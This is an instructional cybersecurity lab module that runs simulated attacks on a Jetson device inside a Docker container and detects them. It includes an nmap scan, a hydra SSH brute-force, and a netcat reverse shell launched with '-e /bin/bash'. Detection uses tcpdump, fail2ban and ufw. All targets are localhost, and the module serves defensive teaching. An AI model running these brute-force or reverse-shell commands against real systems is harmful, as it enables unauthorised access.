💣 Simulated Attacks & Detection on Jetson

🎯 Purpose

This module introduces basic offensive cybersecurity concepts in a safe, controlled container environment. Students simulate attacks and practice detection using the same Linux tools used for defense.

⚠️ These exercises should only be done in isolated or approved lab environments.

⸻

🔧 Tools Overview (Used for Simulation)

Tool	Purpose
nmap	Port scanning and host discovery
hydra	Brute-force login attacks
netcat	Port listener / reverse shell testing
tcpdump	Capture and analyze traffic
fail2ban	Block brute-force attempts
ufw	Block/allow ports and IPs


⸻

🐳 Container Setup for Simulation

Use a Docker container to safely run both attacks and detection tools.

Step 1: Create a container with all tools

docker run -it --rm --network host --name cyberlab \
  -v $(pwd)/labdata:/labdata \
  ubuntu:22.04 /bin/bash

Step 2: Install required tools inside the container

apt update && apt install -y nmap netcat tcpdump ufw fail2ban hydra openssh-server

Set a test password for SSH access:

echo 'student:password123' | chpasswd
service ssh start


⸻

⚔️ Simulated Attack Scenarios

🔎 1. Port Scanning with nmap

nmap -sS -p- 127.0.0.1

Use ss on the host to detect:

ss -tulnp

🔑 2. Brute Force with hydra

hydra -l student -P /labdata/common_passwords.txt ssh://127.0.0.1

Simultaneously monitor with:

tail -f /var/log/auth.log

🐚 3. Reverse Shell Simulation with netcat

On host:

nc -lvnp 4444

In container:

nc 127.0.0.1 4444 -e /bin/bash

Use tcpdump on the host:

sudo tcpdump -i lo port 4444


⸻

🧱 Defense Tools in Action

🛡️ Use ufw to block incoming attacks

ufw enable
ufw deny 22

🚫 Use fail2ban to ban after failed SSH login

cat /etc/fail2ban/jail.conf | grep ssh
systemctl start fail2ban

Check bans:

fail2ban-client status sshd


⸻

🧪 Lab Session: Simulate & Detect in Container

✅ Objective
	•	Simulate port scanning, brute force, and shell attacks
	•	Monitor with defense tools
	•	Practice response and cleanup

🛠️ Workflow
	1.	Launch the container
	2.	Start SSH and monitoring tools
	3.	Simulate scan + brute force
	4.	Use fail2ban, ufw, and tcpdump to detect and respond

📋 Deliverables
	•	Screenshots of hydra, tcpdump, and fail2ban in action
	•	Summary: which tools detected which attacks

⸻

🔐 Ethical Reminder
	•	Never attack real systems without permission
	•	These skills are for learning defense and securing your own systems

